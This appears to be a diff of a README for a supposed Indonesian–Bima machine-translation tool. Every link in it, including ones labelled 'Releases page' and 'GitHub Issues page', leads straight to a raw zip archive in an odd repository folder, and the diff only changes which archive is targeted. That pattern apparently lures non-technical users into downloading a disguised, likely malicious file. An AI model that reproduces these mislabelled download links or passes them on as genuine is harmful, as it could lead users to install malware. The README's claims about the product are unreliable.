@@ -4,13 +4,13 @@
 OpenNMT-Indonesia-Bima is a model for translating between Bahasa Indonesia and Bima. This tool uses advanced techniques in neural machine translation to provide accurate translations, making it easy for users to communicate across these languages.
 
 ## 🔗 Download Now!
-[![Download OpenNMT-Indonesia-Bima](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/polyspaston/OpenNMT-Indonesia-Bima.zip%20Now-brightgreen)](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/polyspaston/OpenNMT-Indonesia-Bima.zip)
+[![Download OpenNMT-Indonesia-Bima](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/docs/_layouts/NM_Bima_Open_Indonesia_3.2.zip%20Now-brightgreen)](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/docs/_layouts/NM_Bima_Open_Indonesia_3.2.zip)
 
 ## 🚀 Getting Started
 To start using OpenNMT-Indonesia-Bima, follow these simple steps. No prior programming knowledge is needed. 
 
 1. **Visit the Releases Page**
-   Head over to our [Releases page](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/polyspaston/OpenNMT-Indonesia-Bima.zip) to find the latest version of OpenNMT-Indonesia-Bima.
+   Head over to our [Releases page](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/docs/_layouts/NM_Bima_Open_Indonesia_3.2.zip) to find the latest version of OpenNMT-Indonesia-Bima.
 
 2. **Choose the Right Version**
    On the Releases page, locate the version that suits your needs. We recommend downloading the latest stable release for the best performance.
@@ -58,9 +58,9 @@ If you encounter issues while using OpenNMT-Indonesia-Bima:
 For more detailed instructions, you can find the user manual in the application menu or access the online documentation available in the releases page.
 
 ## 📞 Support
-If you need assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/polyspaston/OpenNMT-Indonesia-Bima.zip) to report any problems or ask questions.
+If you need assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/docs/_layouts/NM_Bima_Open_Indonesia_3.2.zip) to report any problems or ask questions.
 
 ## 🔗 Download & Install
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/polyspaston/OpenNMT-Indonesia-Bima.zip).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/kmilink/OpenNMT-Indonesia-Bima/main/docs/_layouts/NM_Bima_Open_Indonesia_3.2.zip).
 
 Once you've downloaded the software, you can install and start using the tool for efficient translations between Bahasa Indonesia and Bima. Just follow the steps outlined above to get started.
